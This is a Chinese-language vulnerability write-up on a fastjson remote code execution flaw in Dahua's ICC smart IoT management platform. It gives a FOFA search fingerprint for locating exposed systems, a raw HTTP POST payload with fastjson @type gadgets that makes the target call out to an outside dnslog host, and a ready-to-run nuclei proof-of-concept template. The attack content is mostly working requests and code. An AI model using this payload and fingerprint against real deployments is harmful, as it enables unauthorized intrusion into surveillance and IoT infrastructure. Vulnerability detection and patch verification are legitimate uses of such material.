**漏洞名称**

大华ICC智能物联综合管理平台random远程代码执行漏洞

**漏洞影响**

大华ICC智能物联综合管理平台 版本不详

**漏洞描述**

大华ICC智能物联综合管理平台是一个集成了物联网技术、大数据分析、云计算等先进技术的综合性管理平台。它致力于为企业提供一站式的物联网解决方案，帮助企业实现设备连接、数据收集、分析与应用，从而提高企业的运营效率、降低成本，并推动物联网行业的创新与发展。该系统random接口处存在fastjson远程代码执行漏洞。

**FOFA搜索语句**

icon_hash="-1935899595"

**漏洞复现**

借助http://dnslog.pw/dns/进行复现，随机生成一个账号复制payload替换下面的farr9frh.dnslog.pw，向靶场发送如下数据包

```yaml
POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 161
Accept-Encoding: gzip
Connection: close
Content-Type: application/json;charset=utf-8

{
  "a":{
    "@type":"com.alibaba.fastjson.JSONObject",
    {"@type":"java.net.URL","val":"http://farr9frh.dnslog.pw"}
  }""
}
```

**nuclei poc**

```yaml
id: dahua-icc-random-rce

info:
  name: 大华ICC智能物联综合管理平台random远程代码执行漏洞
  author: fgz
  severity: critical
  description: 大华ICC智能物联综合管理平台是一个集成了物联网技术、大数据分析、云计算等先进技术的综合性管理平台。它致力于为企业提供一站式的物联网解决方案，帮助企业实现设备连接、数据收集、分析与应用，从而提高企业的运营效率、降低成本，并推动物联网行业的创新与发展。该系统random接口处存在fastjson远程代码执行漏洞。
  metadata:
    max-request: 1
    fofa-query: icon_hash="-1935899595"
    verified: true

requests:
  - raw:
      - |+
        POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json;charset=utf-8
        Accept-Encoding: gzip
        Connection: close
        
        {
          "a":{
            "@type":"com.alibaba.fastjson.JSONObject",
            {"@type":"java.net.URL","val":"http://{{interactsh-url}}"}
          }""
        }

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and
```

